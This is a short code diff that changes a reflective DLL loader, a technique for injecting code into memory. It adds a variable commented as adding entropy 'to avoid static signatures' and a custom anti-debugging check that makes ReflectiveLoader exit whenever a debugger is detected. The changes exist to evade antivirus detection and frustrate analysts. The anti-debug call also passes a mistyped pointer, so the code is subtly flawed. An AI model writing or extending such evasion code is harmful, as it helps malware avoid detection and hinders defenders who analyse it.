@@ -8,6 +8,15 @@
 #pragma intrinsic(_ReturnAddress)
 #pragma intrinsic(_rotr)
 
+// Add some entropy to avoid static signatures
+static volatile DWORD g_entropy_var = 0x12345678;
+
+// Simple anti-debug check
+static BOOL IsDebuggerPresent_Custom(VOID) {
+    g_entropy_var ^= 0xDEADBEEF;
+    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &g_entropy_var);
+}
+
 static DWORD ror_dword_loader(DWORD d)
 {
     return _rotr(d, HASH_KEY);
@@ -31,6 +40,11 @@ __declspec(noinline) ULONG_PTR GetIp(VOID)
 
 DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpLoaderParameter)
 {
+    // Anti-debug check
+    if (IsDebuggerPresent_Custom()) {
+        return 0;
+    }
+    
     LOADLIBRARYA_FN fnLoadLibraryA = NULL;
     GETPROCADDRESS_FN fnGetProcAddress = NULL;
     VIRTUALALLOC_FN fnVirtualAlloc = NULL;
